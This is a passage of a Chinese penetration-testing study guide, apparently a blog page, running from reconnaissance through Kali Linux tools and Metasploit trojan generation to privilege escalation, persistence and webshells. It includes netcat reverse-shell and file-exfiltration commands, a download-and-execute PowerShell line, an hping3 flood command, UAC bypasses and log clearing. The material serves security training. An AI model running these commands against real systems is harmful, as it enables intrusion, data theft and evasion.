id="（二）开源情报"><a href="#（二）开源情报" class="headerlink" title="（二）开源情报"></a>（二）开源情报</h2><ol><li><strong>whois</strong>：在 Kali Linux 用 whois 命令查询域名或 IP 地址注册信息，如 whois baidu.com 可查百度相关注册信息。</li><li><strong>CDN</strong><ul><li><strong>绕过 CDN 获取真实 IP 方法</strong><ul><li><strong>邮箱地址</strong>：向目标站发邮件，查看邮件头 Received 字段获取。</li><li><strong>phpinfo 文件</strong>：访问目标根目录下 phpinfo.php 文件，查看 SERVER_ADDR 字段获取。</li><li><strong>分站</strong>：访问未受 CDN 保护的分站获取。</li><li><strong>国外访问</strong>：用国外代理或 VPN 访问 17CE 官网检测获取。</li><li><strong>域名历史解析记录</strong>：在 <a target="_blank" rel="noopener" href="https://sitereport.netcraft.com/">https://sitereport.netcraft.com/</a> 查询域名历史记录获取。</li><li><strong>APP 请求</strong>：分析移动端 APP 网络请求获取。</li></ul></li></ul></li><li><strong>子域名</strong><ul><li><strong>枚举方法</strong><ul><li><strong>Netcraft 在线网站查询</strong>：访问 <a target="_blank" rel="noopener" href="https://searchdns.netcraft.com/">https://searchdns.netcraft.com/</a> 输入域名查询。</li><li><strong>证书透明度公开日志</strong>：访问 <a target="_blank" rel="noopener" href="https://crt.sh/">https://crt.sh/</a> 输入域名搜索。</li><li><strong>AORT 工具</strong>：在 Kali Linux 终端输入“aort -d 域名”枚举。</li><li><strong>subfinder 工具</strong>：先部署 Go 语言环境，安装后在执行文件目录下输入“./subfinder -d 域名”收集。</li></ul></li></ul></li><li><strong>搜索引擎及在线网站</strong><ul><li><strong>Google 搜索引擎</strong>：用特定语法（如 inurl:/admin/upfile.asp 搜索上传文件路径）搜索信息，可在 <a target="_blank" rel="noopener" href="https://www.exploit-db.com/google-hacking-database">https://www.exploit-db.com/google-hacking-database</a> 查看更多语法。</li><li><strong>在线网站</strong>：Shodan（网络扫描引擎，用特定语法查设备信息）、FOFA（网络空间测绘，有独特语法查网页和 IP 信息）、Censys（与 Shodan 类似）等，如 FOFA 中输入 app=”Baidu-云加速”可搜索百度云加速应用。</li></ul></li></ol><h2 id="（三）主动侦查"><a href="#（三）主动侦查" class="headerlink" title="（三）主动侦查"></a>（三）主动侦查</h2><ol><li><strong>DNS 侦查</strong><ul><li><strong>DNSMap</strong>：在 Kali Linux 终端输入“dnsmap 域名 -r dnsmap.txt”枚举子域名并保存结果。</li><li><strong>DNSRecon</strong>：终端输入“dnsrecon -d 域名”查看各种 DNS 记录，也可反向查询（如 dnsrecon -r 110.129.8.1-110.129.8.10 -t rvl–v）。</li><li><strong>DNSEnum</strong>：终端输入“dnsenum 域名”获取子域名及 DNS 记录，默认验证区域传输漏洞。</li><li><strong>Fierce</strong>：终端输入“fierce —domain 域名”扫描子域名和 IP 地址。</li></ul></li><li><strong>主机枚举</strong><ul><li><strong>ATK6</strong>：在 Kali Linux 终端输入 atk6-alive6 eth0 检测内网 IPv6 主机。</li><li><strong>fping</strong>：终端输入 fping -a -g -q 网段（如 192.168.8.0/24）枚举存活主机，也可指定 IP 范围。</li><li><strong>hping3</strong>：可发自定义数据包，如 hping3 —icmp -c 2 IP 地址确认主机存活；hping3 -S —flood —rand-source -p 端口 IP 地址发起 DDoS 攻击；hping3 —scan 端口范围 -S 域名或 IP 地址扫描主机端口；hping3 -c 4 -V -p 80 -F 域名或 IP 地址执行 FIN 扫描。</li><li><strong>nping</strong>：终端输入“nping 域名/IP 地址”扫描存活主机，可指定 IP 范围和端口扫描（如 nping —tcp -p 端口域名或 IP 地址）。</li><li><strong>Nmap</strong>：功能强大，如 nmap -A -T4 域名或 IP 地址检测操作系统等多信息；nmap -T4 域名或 IP 地址 -p 1-65535 全端口扫描；nmap -O 域名或 IP 地址仅扫描操作系统版本；可伪造 MAC 地址（nmap 域名或 IP 地址 —spoof-mac MAC 地址或 0）、分段数据包（nmap -f 域名或 IP 地址）、设置数据包 MTU（nmap —mtu 数据包大小　域名或 IP 地址）、伪造 IP 地址（nmap -D 伪造 IP 地址列表域名或 IP 地址）、插入数据包内容（nmap —data-string“自定义字符串”域名或 IP 地址），组合参数可隐蔽扫描（如 nmap —spoof-mac FF:FF:FF:FF:FF:FF —data-length 24 -T1 -f —mtu 16 -D RND -sS -sV -p 1-65535 -n -oA /root）。</li></ul></li><li><strong>指纹识别</strong><ul><li><strong>插件识别</strong>：在 Firefox 浏览器扩展商店下载 Wappalyzer 插件，安装后点击扩展图标可分析网站技术栈获取指纹。</li><li><strong>WhatWeb</strong>：在 Kali Linux 终端输入“whatweb 域名或 IP 地址”识别网站指纹，可修改请求头（如 whatweb 域名或 IP 地址 -H:Snowwolf:apt -U:Chrome）获取更多信息（whatweb 域名或 IP 地址 -v）。</li><li><strong>WAF 识别</strong>：用 wafw00f 工具识别目标网站 WAF，如 wafw00f 域名或 IP 地址，支持代理（wafw00f 域名或 IP 地址 —proxy=代理地址）。</li></ul></li><li><strong>目录扫描</strong><ul><li><strong>Dirb</strong>：在 Kali Linux 终端输入“dirb 域名或 IP 地址”扫描目录文件，可指定 Cookie（dirb 域名或 IP 地址 -c “Cookie”）、递归扫描（dirb 域名或 IP 地址 –R）、自定义字典（dirb 域名或 IP 地址　字典文件路径）、更改 User-Agent（dirb 域名或 IP 地址 -a “指定 User-Agent”）。</li><li><strong>DirBuster</strong>：在 Kali Linux 中点击左上角 Logo 打开，设置目标 URL、线程数、字典文件、文件扩展名等开始扫描，可设置登录凭据扫描登录后目录。</li><li><strong>Gobuster</strong>：在 Kali Linux 终端执行 gobuster dir -w 字典文件 -u 网站地址扫描，可指定 Cookie 扫描登录后目录（gobuster dir -w 字典文件 -u 网站地址 -c “Cookie”）。</li><li><strong>ffuf</strong>：在 Kali Linux 终端执行 ffuf -u 目标 URL -w 字典文件 -c 扫描，用 FUZZ 关键字占位替换。</li><li><strong>Wfuzz</strong>：在 Kali Linux 终端输入“wfuzz -w 字典文件 —hc 404 目标 URL/FUZZ”扫描，可枚举指定后缀文件（wfuzz -w 字典文件 —hc 404 目标 URL/FUZZ.php）、枚举登录凭据（wfuzz -z file,字典文件 -d “uname=FUZZ&amp;pass=FUZZ” —hc 302 登录页面 URL）、枚举 Cookie 值及登录后目录（wfuzz -w 字典文件 -b cookie=”Cookie 值”域名或 IP 地址/FUZZ），可保存结果（wfuzz -f 输出文件路径,文件类型　-w 字典文件　域名或 IP 地址/FUZZ）。</li></ul></li></ol><h2 id="（四）综合侦查"><a href="#（四）综合侦查" class="headerlink" title="（四）综合侦查"></a>（四）综合侦查</h2><ol><li><strong>Dmitry</strong>：在 Kali Linux 终端输入“dmitry 选项 目标域名或 IP 地址”收集信息，如 dmitry -winsepo 输出文件 目标域名可收集多类信息并保存到文件。</li><li><strong>Maltego</strong><ul><li><strong>配置</strong>：注册 Maltego 社区版账户，在 Kali Linux 启动 Maltego 选 CE 版登录，设置隐私模式（如 Normal Privacy Mode），在 Maltego Transform Hub 窗口激活数据集成工具。</li><li><strong>使用</strong>：点击 Machines 标签添加操作机器（如 Footprints L1）并配置，填写域名执行信息收集，右键实体可操作，可切换视图、保存打开信息，也可新建页面拖放实体收集信息。</li></ul></li><li><strong>SpiderFoot</strong>：在 Kali Linux 终端输入“spiderfoot -l 127.0.0.1:5001”启动 Web 服务，在浏览器访问对应 URL 进入 Web 界面，创建新扫描任务设置目标与配置（如 All 获取所有信息）后开始扫描，可查看进度结果、分类信息、图形化关系等，可保存信息与设置扫描参数。</li></ol><h1 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h1><h2 id="（一）漏洞数据库"><a href="#（一）漏洞数据库" class="headerlink" title="（一）漏洞数据库"></a>（一）漏洞数据库</h2><ul><li><strong>概述</strong>：收集存储软件漏洞信息，为渗透测试、开发及运维人员提供利用方法、修复建议，包含名称、编号等多类信息，有官方和非官方多种来源，以网站或软件形式提供服务。</li><li><strong>searchsploit工具</strong>：Kali Linux本地强大搜索工具，可离线按关键词等搜索，如<code>searchsploit ftpd</code>搜 ftpd 服务漏洞，能联动 Nmap。用<code>nmap 域名或 IP 地址 -sV -oX nmap.xml</code>生成信息文件后，<code>searchsploit --nmap nmap.xml</code>可查相关漏洞，利用程序多为脚本，部分需编译，如<code>gcc 16270.c -o test.exe</code>编译后执行验证漏洞。</li></ul><h2 id="（二）Nmap-漏洞扫描"><a href="#（二）Nmap-漏洞扫描" class="headerlink" title="（二）Nmap 漏洞扫描"></a>（二）Nmap 漏洞扫描</h2><ul><li><strong>基础介绍</strong>：功能强大，可端口扫描等，其脚本引擎（NSE）用 Lua 语言编写脚本发挥威力。</li><li><strong>使用 NSE 脚本扫描</strong><ul><li>脚本分类多，<code>vuln</code>类用于检测漏洞，如<code>nmap --script vuln -T4 域名或 IP 地址</code>运行所有漏洞脚本，<code>nmap --script http-title 域名或 IP 地址</code>运行特定脚本查看网页标题，<code>nmap --script-help=脚本名或文件名</code>查看帮助。</li><li>也可运行所有脚本，但<code>--script all</code>危险，因包含有害脚本，需谨慎。</li></ul></li><li><strong>自定义 NSE 脚本</strong>：用 Lua 语言在 Nmap 的 NSE 脚本目录编写，如创建<code>phpinfo.nse</code>检测网站<code>phpinfo.php</code>文件，编写后可用<code>nmap --script-help phpinfo.nse</code>检查，<code>nmap 域名或 IP 地址 --script phpinfo</code>检测文件是否存在。</li></ul><h2 id="（三）Nikto-漏洞扫描"><a href="#（三）Nikto-漏洞扫描" class="headerlink" title="（三）Nikto 漏洞扫描"></a>（三）Nikto 漏洞扫描</h2><ul><li>开源 Web 扫描评估程序，<code>nikto -Display 1234ep -h 域名或 IP 地址</code>执行扫描，可发现多种安全问题，如 PHP 代码执行漏洞，<code>nikto -Display 1234ep -h 域名或 IP 地址 -o nikto.html</code>可保存结果，<code>nikto -list-plugins</code>查看插件，<code>nikto -Display 1234ep -h 域名或 IP 地址 -Plugins 插件名称</code>用指定插件扫描。</li></ul><h2 id="（四）Wapiti-漏洞扫描"><a href="#（四）Wapiti-漏洞扫描" class="headerlink" title="（四）Wapiti 漏洞扫描"></a>（四）Wapiti 漏洞扫描</h2><ul><li>开源轻量级 Web 应用漏洞扫描工具，<code>wapiti -u 域名或 IP 地址 --color</code>简单扫描，自动爬取页面检测漏洞，扫描后生成 HTML 报告，<code>wapiti-getcookie -u 域名或 IP 地址 -c cookie.txt</code>生成 Cookie 文件用于登录后扫描，<code>wapiti -u 域名或 IP 地址 --cookie cookie.txt</code>加载 Cookie 扫描。</li></ul><h2 id="（五）ZAP-漏洞扫描"><a href="#（五）ZAP-漏洞扫描" class="headerlink" title="（五）ZAP 漏洞扫描"></a>（五）ZAP 漏洞扫描</h2><ul><li><strong>主动扫描</strong><ul><li>核心功能，自动渗透测试常见漏洞，扫描前需设置代理（ZAP 用 8080 端口，浏览器依类型设置）和证书（ZAP 生成后导入浏览器），如在 ZAP 主界面操作和 Firefox 中配置。</li><li>配置后在 ZAP 中选目标网站，启动传统和 AJAX 爬行扫描，扫描结果在警报栏按等级显示，可查看详细信息生成报告。</li></ul></li><li><strong>手动探索</strong>：设置代理后，在 ZAP 启动代理浏览器访问网站，手动输入参数测试漏洞，ZAP 记录请求响应，可修改重发。</li></ul><h2 id="（六）xray-漏洞扫描"><a href="#（六）xray-漏洞扫描" class="headerlink" title="（六）xray 漏洞扫描"></a>（六）xray 漏洞扫描</h2><ul><li>免费白帽子工具，支持多种漏洞检测与框架构建，可联动其他工具。从官网或 Github 下载解压后运行生成配置文件启动。</li><li><strong>爬虫扫描</strong>：如<code>webscan</code>模式，<code>./xray_linux_amd64 webscan --basic-crawler http://testphp.vulnweb.com --html-output vulnweb.html</code>启动基础爬虫检测漏洞，可查看结果分析。</li><li><strong>被动式扫描</strong>：先生成 CA 证书（<code>./xray_linux_amd64 genca</code>），设置浏览器代理（如 Firefox 改端口为 7777 并导入证书），在终端用<code>./xray_linux_amd64 webscan --listen 127.0.0.1:7777 --html-output proxy.html</code>开启监听扫描，访问 URL 后查看结果。</li></ul><h2 id="（七）CMS-漏洞扫描"><a href="#（七）CMS-漏洞扫描" class="headerlink" title="（七）CMS 漏洞扫描"></a>（七）CMS 漏洞扫描</h2><ul><li><strong>WPScan（WordPress 扫描）</strong>：预装在 Kali Linux，<code>wpscan --update</code>更新数据库，注册获取 API Token，<code>wpscan --url 域名或 IP 地址 --api-token Token</code>扫描 WordPress 网站，扫描结果有漏洞链接，可查看详细信息和 PoC 代码验证漏洞。</li><li><strong>JoomScan（Joomla!扫描）</strong>：安装用<code>apt install joomscan</code>，<code>jomscan -u 域名或 IP 地址</code>扫描 Joomla!网站，扫描后在<code>/usr/share/joomscan/reports/</code>生成报告，可查看漏洞信息。</li></ul><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="（一）Web-安全漏洞"><a href="#（一）Web-安全漏洞" class="headerlink" title="（一）Web 安全漏洞"></a>（一）Web 安全漏洞</h2><p>常见类型如 SQL 注入、HTML 注入等多种，是渗透测试重要攻击目标，Kali Linux 有相关工具利用。</p><h2 id="（二）Burp-Suite-使用"><a href="#（二）Burp-Suite-使用" class="headerlink" title="（二）Burp Suite 使用"></a>（二）Burp Suite 使用</h2><ul><li><strong>配置代理</strong>：启动后选默认配置进入主界面，关闭拦截，在 Options 标签改代理设置（默认 127.0.0.1:8080），生成证书，在浏览器（如 Firefox）设置代理并导入证书，可拦截 HTTPS 流量，验证后可对请求包操作。</li><li><strong>基础用法</strong><ul><li><strong>Dashboard</strong>：付费版可漏洞扫描，显示任务、日志和漏洞信息。</li><li><strong>Target</strong>：<code>Site map</code>显示爬虫信息，<code>Scope</code>设扫描范围，<code>Issue definitions</code>看漏洞详情。</li><li><strong>Proxy</strong>：<code>HTTP history</code>记录代理信息，<code>Options</code>设代理，<code>WebSockets history</code>看 Socket 连接记录，还有其他功能区可设置规则和操作请求响应。</li><li><strong>Decoder</strong>：字符串加解密。</li><li><strong>Comparer</strong>：对比请求，暴力破解常用。</li><li><strong>Extender</strong>：添加扩展插件并设置。</li><li><strong>Project options</strong>：配置项目，可保存设置。</li><li><strong>User options</strong>：配置用户，如身份验证、代理转发等。</li></ul></li><li><strong>获取文件路径</strong>：开启拦截访问目标站，发送请求包到 Repeater，添加到站点地图，在 Target 查看生成的 URL 地址。</li><li><strong>实战应用</strong><ul><li><strong>身份验证绕过</strong>：如修改 Cookie 中参数绕过网站身份验证。</li><li><strong>暴力破解</strong>：以 WRCS 网站为例，先搜集信息生成字典，在 Burp Suite 拦截登录包发送到 Intruder，设置破解字段和攻击类型（Sniper 等）及字典文件后开始破解，根据状态码和字节长度判断密码。</li><li><strong>与 xray 联动</strong>：在 Burp Suite 的 User options 配置上游代理地址，xray 开启监听，Firefox 用原代理访问网站，可在 Burp Suite 查看请求，xray 扫描漏洞。</li></ul></li></ul><h2 id="（三）SQL-注入"><a href="#（三）SQL-注入" class="headerlink" title="（三）SQL 注入"></a>（三）SQL 注入</h2><ul><li><strong>sqlmap 工具</strong><ul><li><strong>基本功能</strong>：检测利用 Web 应用数据库漏洞，如<code>sqlmap -u 链接地址</code>检测，<code>sqlmap -u 链接地址 --batch</code>用默认选项检测，可查看数据库多类信息（用户、权限等）并操作。</li><li><strong>数据库交互</strong>：执行 SQL 语句、shell 命令等，如<code>sqlmap -u &quot;URL 地址&quot; --sql-query=&quot;查询语句&quot; –batch</code>执行查询，<code>sqlmap -u &quot;URL 地址&quot; --os-cmd=系统命令 --batch</code>执行系统命令，<code>sqlmap -u &quot;URL 地址&quot; --os-shell --batch</code>获取操作系统访问权限，还有文件写入等操作。</li><li><strong>POST 请求注入</strong>：可用<code>sqlmap -u &quot;URL 地址&quot; --data=&quot;POST 的内容&quot;　--batch</code>或保存请求文件用<code>sqlmap -r 保存的文件 --batch</code>检测，<code>-m</code>选项可批量检测多个目标。</li><li><strong>登录表单注入</strong>：<code>sqlmap -u &quot;URL 地址&quot; --cookie=&quot;cookie 值&quot; --batch</code>检测登录后注入点，<code>sqlmap -u &quot;URL 地址&quot; --forms –batch</code>自动检测表单参数。</li><li><strong>指定注入方式</strong>：如<code>sqlmap -u &quot;URL 地址&quot; --technique=E --batch</code>指定报错注入。</li><li><strong>使用脚本</strong>：<code>sqlmap -u &quot;URL 地址&quot;　--batch --tamper 脚本名</code>用脚本绕过 WAF，脚本在<code>/usr/share/sqlmap/tamper/</code>目录。</li><li><strong>编写脚本</strong>：如创建<code>and.py</code>将 SQL 注入 payload 中的<code>AND</code>替换为<code>/*!AND*/</code>绕过 WAF，编写后按格式使用。</li></ul></li><li><strong>JSQL Injection</strong>：安装用<code>apt install jsql-injection</code>，启动后输入 URL 扫描利用漏洞，可进行数据库多操作，还有批量测试等功能，可设置相关参数和更改配置。</li></ul><h2 id="（四）XSS-漏洞"><a href="#（四）XSS-漏洞" class="headerlink" title="（四）XSS 漏洞"></a>（四）XSS 漏洞</h2><ul><li><strong>XSSer</strong>：安装用<code>apt install xsser</code>，<code>xsser -u &quot;URL 地址&quot; -g &#39;路径和参数&#39;</code>检测 GET 请求 XSS 漏洞，<code>xsser -u &quot;URL 地址&quot; -c 爬虫深度 --Cl URL 地址</code>自动化检测，还有图形界面。</li><li><strong>XSStrike</strong>：安装用<code>pip3 install xsstrike</code>，<code>xsstrike -u &quot;URL 地址&quot;</code>扫描，可检测多种 XSS 漏洞类型和 POST 请求，能扫描登录后页面，还有盲注功能。</li><li><strong>BeEF 框架</strong>：安装用<code>apt-get update</code>和<code>apt-get install beef-xss</code>，启动后设密码登录控制面板，注入 Hook 地址利用漏洞，可获取 Cookie、钓鱼等，还有多种模块，停止用<code>beef-xss-stop</code>。</li></ul><h2 id="（五）文件包含漏洞"><a href="#（五）文件包含漏洞" class="headerlink" title="（五）文件包含漏洞"></a>（五）文件包含漏洞</h2><ul><li><strong>Uniscan</strong>：安装用<code>apt install uniscan</code>，<code>uniscan -u URL 地址 -qweds</code>基本扫描，可批量检测，在<code>/usr/share/uniscan/report</code>生成报告，还有图形界面。</li></ul><h2 id="（六）Metasploit-渗透测试框架"><a href="#（六）Metasploit-渗透测试框架" class="headerlink" title="（六）Metasploit 渗透测试框架"></a>（六）Metasploit 渗透测试框架</h2><ul><li><strong>基础结构</strong>：Ruby 编写，各目录功能不同，<code>/usr/share/metasploit-framework/modules/</code>含多种模块分类，<code>msfconsole</code>启动终端模式，会话为 Meterpreter。</li><li><strong>木马生成</strong>：先选目标系统 Payload（如<code>msfvenom -l payloads</code>查看后筛选）和编码方式，用<code>msfvenom -p 使用的 payload -e 编码 -i 编码次数 LHOST=本机 IP 地址 LPORT=本机端口 -f 保存的文件格式 &gt; 保存的路径</code>生成木马，发送到目标后在 Metasploit 终端开启监听获取会话，可进行调优和多种操作（如<code>sysinfo</code>获取系统信息）。</li><li><strong>扫描并利用漏洞</strong>：用 Nmap 扫描目标主机信息保存为 XML 文件后导入 Metasploit，查询利用漏洞模块（如<code>search vsftpd</code>）并运行。</li><li><strong>生成外网木马文件</strong>：选正向连接 Payload（<code>msfvenom -l payloads | grep bind</code>）替换反向 Payload，用内网穿透工具（如 Ngrok）生成配置和公网地址，按此生成木马，在 Metasploit 设置监听获取外网回连会话。</li></ul><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="提权基础"><a href="#提权基础" class="headerlink" title="提权基础"></a>提权基础</h2><ul><li><strong>提权重要性</strong>：在渗透测试中，获取目标主机更高权限可扩大攻击范围，如从 Guest 或 User 权限提升到管理员或系统权限，有助于获取密码哈希、修改注册表及持久化控制等操作。</li><li><strong>提权分类</strong>：分为本地提权（低权限用户利用本地应用或系统漏洞提升权限）和远程提权（攻击者通过漏洞利用程序提升远程主机权限）。</li><li><strong>信息收集前置步骤</strong>：针对 Windows 系统，通过 <code>net user</code> 查看所有用户，<code>net localgroup Administrators</code> 查看管理员用户组，<code>systeminfo</code> 获取系统详细信息与补丁；对于 Linux 系统，可利用 GitHub 上的相关脚本（如 Linux_Exploit_Suggester）检测提权漏洞，为提权做准备。</li></ul><h2 id="Metasploit-框架提权"><a href="#Metasploit-框架提权" class="headerlink" title="Metasploit 框架提权"></a>Metasploit 框架提权</h2><ul><li><strong>系统权限提升</strong>：建立 meterpreter 会话后，执行 <code>getsystem</code> 命令尝试提升权限，但存在如无法执行系统函数、命名管道占用等限制，常需配合其他后渗透模块，如绕过用户账户控制和提高运行级别的模块。</li><li><strong>UAC 绕过</strong>：Windows Vista 及以上版本引入 UAC 防止未经授权修改系统。在 Metasploit 中，可使用 <code>exploit/windows/local/bypassuac</code> 等模块绕过。例如，先将会话置于后台（<code>background</code>），配置模块后运行获取新会话，再结合 <code>getsystem</code> 提权；还可使用 <code>bypassuac_injection</code> 等其他模块通过进程注入等方式绕过，若不确定使用哪个模块，可利用 <code>post/multi/recon/local_exploit_suggester</code> 进行自动化检测。</li><li><strong>假冒令牌提权</strong>：令牌是系统临时密钥，如访问令牌、密保令牌等。在 meterpreter 会话中，加载 <code>incognito</code> 模块，使用 <code>list_tokens -u</code> 列出委派令牌，通过 <code>impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</code> 假冒系统用户令牌获取其权限。</li><li><strong>利用 RunAs 提权</strong>：使用 <code>exploit/windows/local/ask</code> 模块创建可执行文件上传到目标主机，运行时提示用户是否继续，若用户同意则在 Metasploit 触发高权限新会话，后续可通过 <code>getsystem</code> 提权，提权后需用 <code>clearev</code> 删除上传文件清除痕迹。</li></ul><h2 id="PowerShell-脚本提权"><a href="#PowerShell-脚本提权" class="headerlink" title="PowerShell 脚本提权"></a>PowerShell 脚本提权</h2><ul><li><strong>PowerShell 基础</strong><ul><li><strong>脚本与执行策略</strong>：PowerShell 脚本后缀为 <code>.ps1</code>，执行策略有 Restricted（默认，禁止脚本运行）、AllSigned、RemoteSigned、Unrestricted 四种。可在 PowerShell 窗口用 <code>Get-ExecutionPolicy</code> 获取当前策略，<code>set-executionpolicy 策略名称</code> 设置策略，但修改策略需管理员或系统权限。</li><li><strong>策略绕过方法</strong>：本地权限绕过可在 cmd 窗口输入 <code>powershell.exe–Nop–NonI–Exec Bypass–Command &quot;&amp; &#123;Import-Module 脚本路径; 脚本名称&#125;&quot; -noexit</code>；下载远程脚本绕过可在目标主机 PowerShell 环境输入 <code>IEX (New-Object Net.WebClient).DownloadString (&quot;脚本地址&quot;)</code>。同时，可通过特定命令关闭不同版本 PowerShell 的安全警告。</li></ul></li><li><strong>PowerSploit 提权</strong>：其脚本位于 <code>/usr/share/windows-resources/powersploit</code> 目录。加载 <code>Privesc.psd1</code> 文件后，<code>Invoke-PrivescAudit -Format HTML</code> 可检测提权方法并以 HTML 格式输出。例如，<code>Get-System</code> 命令可通过假冒令牌提升线程权限（PowerShell 2.0 需添加 <code>-STA</code> 标志）；导入 <code>Exfiltration.psd1</code> 文件后，<code>Invoke-TokenManipulation</code> 系列命令可操作令牌；<code>Get-ModifiableService</code> 和 <code>voke-ServiceAbuse</code> 可调用服务创建用户；<code>Get-Service 服务名称 | Write-ServiceBinary</code> 可利用预编译可执行文件相关操作；还有如 <code>Invoke-Mimikatz</code> 等其他实用模块。</li><li><strong>Nishang 提权</strong>：在 Kali Linux 安装后，脚本位于 <code>/usr/share/nishang</code> 目录。加载 <code>nishang.psm1</code> 文件后可使用模块。如 <code>Invoke-PsUACme</code> 可绕过 UAC；<code>Enable-DuplicateToken</code> 可复制令牌提权；还有 <code>Get-Information</code>、<code>Check-VM</code> 等多个实用模块用于获取信息、检测虚拟机、获取凭据、删除补丁等操作。</li></ul><h2 id="Starkiller-后渗透框架提权"><a href="#Starkiller-后渗透框架提权" class="headerlink" title="Starkiller 后渗透框架提权"></a>Starkiller 后渗透框架提权</h2><ul><li><strong>基础使用</strong>：在 Kali Linux 安装后，开启本地 <code>empire</code> 服务端（<code>powershell-empire server --username=用户名 --password=密码</code>），登录 Starkiller 后配置监听器和 Payload，上传到目标 Windows 主机运行获取代理会话，通过界面操作执行命令、上传下载文件、管理模块和凭据等。</li><li><strong>提权操作</strong><ul><li><strong>绕过 UAC</strong>：在会话模块区域选择如 <code>powershell/privesc/bypassuac</code> 模块并配置监听器提权，新会话可能需进一步用 <code>powershell/privesc/getsystem</code> 提升到系统权限。</li><li><strong>利用溢出漏洞</strong>：利用自带的 <code>MS16-032</code> 和 <code>MS16-135</code> 等模块，如设置 <code>powershell/privesc/ms16-135</code> 模块并配置监听器可提升权限。</li><li><strong>RunAs 提权</strong>：输入 <code>powershell/privesc/ask</code> 模块并配置后，目标主机用户确认可生成新会话，再用 <code>powershell/privesc/getsystem</code> 获取系统权限。</li><li><strong>提权辅助</strong>：<code>powershell/privesc/sherlock</code> 模块可枚举提权漏洞。</li></ul></li></ul><h1 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h1><h2 id="Metasploit-框架持久化"><a href="#Metasploit-框架持久化" class="headerlink" title="Metasploit 框架持久化"></a>Metasploit 框架持久化</h2><ul><li><strong>修改注册表启动项</strong>：获取最高权限 meterpreter 会话后，使用 <code>persistence</code> 模块，配置会话 ID 和监听端口，会上传 vbs 文件到 <code>C:\Users\用户名\AppData\Local\Temp\</code>，目标主机重启或用户重新登录时通过注册表 <code>CurrentVersion\Run</code> 执行 Payload。需在 Kali Linux 另开终端配置监听模块获取会话。</li><li><strong>创建持久化服务</strong>：使用 <code>persistence_service</code> 模块，配置会话 ID 和端口号，上传可执行文件并创建持久化服务，运行时执行 Payload，但该服务无验证功能。可通过 <code>resource 生成的脚本路径</code> 删除可执行文件。</li></ul><h2 id="Starkiller-框架持久化"><a href="#Starkiller-框架持久化" class="headerlink" title="Starkiller 框架持久化"></a>Starkiller 框架持久化</h2><ul><li><strong>创建计划任务</strong>：选择 <code>powershell/persistence/userland/schtasks</code> 模块，设置触发时间和监听器名称，在目标主机注册表添加计划任务，每天指定时间执行脚本获取新会话。</li><li><strong>创建快捷方式后门</strong>：选择 <code>powershell/persistence/userland/backdoor_lnk</code> 模块，填写 <code>.LNK</code> 文件路径和监听器等信息，在目标主机创建快捷方式后门，重启时运行返回新会话。</li><li><strong>利用 WMI 部署无文件后门</strong>：选择 <code>powershell/persistence/elevated/wmi_updater</code> 模块（需管理员权限），利用 WMI 事件订阅机制，设置相关参数后上传 <code>.bat</code> 文件，目标主机重启后在内存中运行后门获取新会话。</li></ul><h2 id="持久化交互式代理"><a href="#持久化交互式代理" class="headerlink" title="持久化交互式代理"></a>持久化交互式代理</h2><ul><li><strong>Netcat 实现</strong><ul><li><strong>创建交互式代理会话</strong>：在 Kali Linux 找到 <code>nc.exe</code> 上传到目标主机，在 Kali Linux 终端监听端口（<code>nc -lvp 端口号</code>），在目标主机 meterpreter 会话利用 <code>execute -f &quot;nc.exe 本机 IP 地址　本机端口 -e c:\windows\system32\cmd.exe&quot;</code> 获取反向连接会话（可创建隐藏会话），也可在目标主机开启监听进行正向连接，Linux 系统主机需更改交互程序。</li><li><strong>转储文件</strong>：在 Kali Linux 监听端口并输出到文件（<code>nc -lvp 本地监听端口 &gt; pass.txt</code>），在目标主机利用重定向将文件内容通过 Netcat 发送到 Kali Linux 监听端口，实现文件传输。</li></ul></li><li><strong>DNS 命令控制</strong><ul><li><strong>DNSteal 工具使用</strong>：在 Kali Linux 下载 <code>DNSteal</code> 并运行作为 DNS 服务器。转储文件时，在目标主机按特定命令格式将文件内容编码通过 DNS 查询发送到服务器，文件传输两遍后在 Kali Linux 查看；执行系统命令时，替换命令中的 <code>ls.</code> 为任意命令，在 Kali Linux 查看枚举信息。</li></ul></li><li><strong>PowerShell 命令控制</strong><ul><li><strong>建立反向会话</strong>：在 Kali Linux 监听端口，在目标主机导入 <code>Invoke-PowerShellTcp.ps1</code> 模块并配置参数，实现与 Kali Linux 反向通信，可执行系统命令。</li><li><strong>建立正向会话</strong>：在目标主机导入模块并开启监听端口，在 Kali Linux 输入命令连接，建立正向会话进行命令控制。</li></ul></li></ul><h2 id="WebShell"><a href="#WebShell" class="headerlink" title="WebShell"></a>WebShell</h2><ul><li><strong>Metasploit 框架网页后门</strong>：在 Kali Linux 利用 <code>msfvenom</code> 生成如 PHP 格式的反向连接 WebShell（<code>msfvenom -p php/meterpreter/reverse_tcp LHOST=本机 IP 地址 LPORT=本机监听端口　-f raw &gt; webshell.php</code>），上传到目标服务器 Web 目录，在 Metasploit 配置监听模块，访问 WebShell 文件触发反向连接获取控制权。</li><li><strong>Weevely</strong>：在 Kali Linux 生成 WebShell 文件（<code>weevely generate 连接密码　生成的 WebShell 文件名</code>）并上传到目标服务器，然后连接（<code>weevely 上传或注入 WebShell 的目标服务器的地址 WebShell 密码</code>）。连接后可利用自带模块获取目标主机信息、进行文件操作（如 <code>file_upload2web</code>、<code>file_download</code> 等）和执行命令（如 <code>shell_php</code> 等）。</li><li><strong>WeBaCoo</strong>：在 Kali Linux 安装后生成 PHP 格式后门文件（<code>webacoo -g -o 文件名</code>）并上传到目标主机 Web 目录，连接（<code>webacoo -t -u 上传地址</code>）后可执行系统命令，其特点是隐蔽性强。</li><li><strong>蚁剑</strong>：在 Kali Linux 先下载加载器并安装蚁剑，安装后打开主界面添加 WebShell 地址进行管理，可通过虚拟终端执行命令、文件管理操作文件、插件市场下载插件，支持多种脚本类型、功能模块、编码解码和插件。</li><li><strong>WebShell 文件</strong>：Kali Linux 的 <code>/usr/share/webshells</code> 目录下有多种 WebShell 文件，如上传 PHP 格式文件到目标主机 Web 目录并访问可执行操作，可根据目标系统选择合适文件。</li></ul><h1 id="内网横向渗透"><a href="#内网横向渗透" class="headerlink" title="内网横向渗透"></a>内网横向渗透</h1><h2 id="（一）信息收集"><a href="#（一）信息收集" class="headerlink" 